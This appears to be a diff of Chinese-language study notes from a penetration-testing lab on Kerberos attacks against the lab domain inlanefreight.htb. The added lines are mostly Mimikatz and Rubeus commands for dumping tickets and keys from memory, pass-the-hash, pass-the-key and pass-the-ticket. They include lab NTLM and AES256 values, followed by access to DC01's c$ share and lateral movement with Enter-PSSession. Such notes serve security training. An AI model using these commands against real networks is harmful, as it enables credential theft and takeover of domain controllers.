@@ -430,18 +430,41 @@ Kerberos 基于票据
 
 c:\tools> mimikatz.exe
 mimikatz # privilege::debug
-mimikatz # sekurlsa::tickets /export
+mimikatz # sekurlsa::tickets /export            导出票据
 mimikatz # exit
-c:\tools> dir *.kirbi
+c:\tools> dir *.kirbi      列出当前目录所有 kirbi 文件
+
+c:\tools> Rubeus.exe dump /nowrap      同上
 
 
+c:\tools> mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # sekurlsa::ekeys                      提取密钥，对称加密时间戳，用于生成 TGT，需要管理员
+mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f            密钥传递 (Pass the Key) 或称 哈希传递之上 (OverPass the Hash)，获得一个cmd
 
 
-  kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
+c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap      提取密钥
+c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt                                            传递票据，无cmd
+C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show                                                                             获得cmd
+在cmd里  C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
+c:\tools>powershell      启动 PS
+PS C:\tools> Enter-PSSession -ComputerName DC01      横向移动到 DC01
+或
+c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi                                                            用 mimikatz 导出的票据，传递
+或
+PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))                          将 kirbi 内容转成Base64  
+c:\tools> Rubeus.exe ptt /ticket:Base64格式的票据
+c:\tools> dir \\DC01.inlanefreight.htb\c$      查看受保护目录
+或
+C:\tools> mimikatz.exe 
+mimikatz # privilege::debug
+mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"      传递票据
+mimikatz # exit
+c:\tools> dir \\DC01.inlanefreight.htb\c$      查看受保护目录
+c:\tools>powershell      启动 PS
+PS C:\tools> Enter-PSSession -ComputerName DC01      横向移动到 DC01
 
-  Enter-PSSession -ComputerName DC01
 
-  https://github.com/GhostPack/Rubeus
 
 
 Proxies:
